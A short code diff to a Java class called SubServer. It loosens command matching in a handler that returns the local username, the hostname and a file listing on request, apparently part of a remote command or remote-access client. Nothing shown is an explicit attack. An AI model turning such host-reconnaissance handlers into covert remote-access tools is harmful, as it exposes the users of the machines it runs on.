@@ -47,15 +47,16 @@ public class SubServer {
         return ret;
     }
     private static String execute_command(String command) {
-        if (command.equals(prefix + "hi")) {
+        if (command.contains(prefix + "hi")) {
             return "hi";
         }
-        else if(command.equals(prefix + "files")) {
+        else if(command.contains(prefix + "files")) {
+            //return "files";
             return getFiles(command);
         }
-        else if(command.equals(prefix + "username"))
+        else if(command.contains(prefix + "username"))
             return System.getProperty("user.name"); //return Username
-        else if(command.equals(prefix + "hostname" )) {
+        else if(command.contains(prefix + "hostname" )) {
             try {
                 return InetAddress.getLocalHost().getHostName(); //return Hostname
             } catch (UnknownHostException e) {
